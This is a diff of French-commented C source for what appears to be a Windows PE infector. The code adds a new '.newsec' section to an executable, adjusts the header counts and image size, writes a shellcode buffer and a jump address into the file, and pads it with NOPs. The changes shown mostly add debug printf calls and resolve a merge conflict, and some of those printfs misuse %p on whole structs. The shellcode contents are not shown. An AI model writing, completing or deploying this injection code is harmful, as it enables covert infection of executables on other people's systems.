@@ -71,9 +71,16 @@ char shellcode[] =
 
     if (executableHandle == INVALID_HANDLE_VALUE || executableMappe == INVALID_HANDLE_VALUE || executableEnMemoire == INVALID_HANDLE_VALUE)
 	    return 1;
+printf("Sizeof(IMAGE_DOS_HEADER) %i \r\n", sizeof(IMAGE_DOS_HEADER));
+printf("Sizeof(IMAGE_NT_HEADERS) %i \r\n", sizeof(IMAGE_NT_HEADERS));
+printf("Sizeof(IMAGE_FILE_HEADER) %i \r\n", sizeof(IMAGE_FILE_HEADER));
+printf("Sizeof(IMAGE_OPTIONAL_HEADER) %i \r\n", sizeof(IMAGE_OPTIONAL_HEADER));
+printf("Sizeof(IMAGE_SECTION_HEADER) %i \r\n", sizeof(IMAGE_SECTION_HEADER));
 
-    infosExecutable = (PIMAGE_DOS_HEADER)executableEnMemoire;
-
+infosExecutable = (PIMAGE_DOS_HEADER)executableEnMemoire;
+	printf(" &PIMAGE_DOS_HEADERS: %p \r\n", &infosExecutable);
+	printf(" PIMAGE_DOS_HEADERS: %p \r\n", infosExecutable);
+	printf(" *PIMAGE_DOS_HEADERS: %p \r\n", *infosExecutable);
     if (infosExecutable->e_magic != IMAGE_DOS_SIGNATURE)
     {
         printf("[!] Il ne s'agit pas d'un binaire au format PE.\n");
@@ -97,21 +104,45 @@ char shellcode[] =
     DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
     DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
 
-	//addr infosPe (IMAGE_NT_HEADERS) + sizeof (IMAGE_NT_HEADERS) pointe sur le 1er section_header
-    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS)); 
-    // infosSection += numbersection * sizeof(image_section_header) pointe sur la fin des sectiosn header 
-    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
+    
 
-   // pointe sur le nouvel section header
+  
+
+    printf("& PIMAGE_NT_HEADERS: %p  \r\n", &infosPE);
+    printf("IMAGE_NT_HEADERS: %p  \r\n", infosPE);
+    printf(" *PIMAGE_NT_HEADERS: %p  \r\n", *infosPE);
+    
+    //addr infosPe (IMAGE_NT_HEADERS) + sizeof (IMAGE_NT_HEADERS) pointe sur le 1er section_header
+    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS)); 
+
+    printf(" &PIMAGE_SECTION_HEADER : %p,   \r\n", &infosSection);
+     printf(" PIMAGE_SECTION_HEADER : %p,   \r\n", infosSection);
+    printf("*PIMAGE_SECTION_HEADER : %p \r\n", *infosSection);
+
+    // infosSection += numbersection * sizeof(image_section_header) pointe sur la fin des sections header 
+    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
+    printf("Nombre de sections : %i \r\n", infosPE->FileHeader.NumberOfSections);
+
+    printf("&PIMAGE new section HEADER : %p \r\n", &infosSection);
+    printf("PIMAGE new section HEADER : %p \r\n", infosSection);
+    printf("  *PIMAGE NEW SECTION HEADER : %p \r\n", *infosSection);
+
+// pointe sur le nouvel section header
     PIMAGE_SECTION_HEADER notreSection = (PIMAGE_SECTION_HEADER)(infosSection);
-<<<<<<< .mine
-    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédente pour calculer la vsize et voffset.
-=======
-    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédent pour calculer la vsize et voffset.
->>>>>>> .r16
+
+    //On retrouve l'addr de l'entete précédente pour calculer la vsize et voffset.
+    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); 
+printf("Entete precedente : %p \r\n", infosSection);
+printf("Entete precedente : %p \r\n", *infosSection);
+	
 
     (*pointeurNombreDeSection)++;
-    (*pointeurSizeOfImage) += tailleSection;
+  
+  printf("pointeurSizeOfImage : %p, SizeofImage : %i \r\n", pointeurSizeOfImage, *pointeurSizeOfImage);
+  printf("tailleSection : %i \r\n", tailleSection);
+(*pointeurSizeOfImage) += tailleSection;
+
+  printf("new sizeofImage  : %i \r\n", *pointeurSizeOfImage);
 
     char* nomSection = ".newsec"; //7char + \0 => tjrs 8chars.
 
@@ -139,7 +170,7 @@ char shellcode[] =
     CloseHandle(executableMappe);
 
     HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
-    SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN); /*0 added*/
+    SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
 
     WriteFile(fp,shellcode,(strlen(shellcode) + 0),&taille,NULL);//on écrit notre shellcode.
     WriteFile(fp,&decallage,sizeof(DWORD),&taille,NULL);// notre adresse sur laquel jump !
@@ -149,7 +180,7 @@ char shellcode[] =
 	{
 		WriteFile(fp,"\x90",1,&taille,NULL);
   	}		
-	//on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information./*0 added*/
+	//on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information.
 	CloseHandle(fp);
 	return 0;
 }
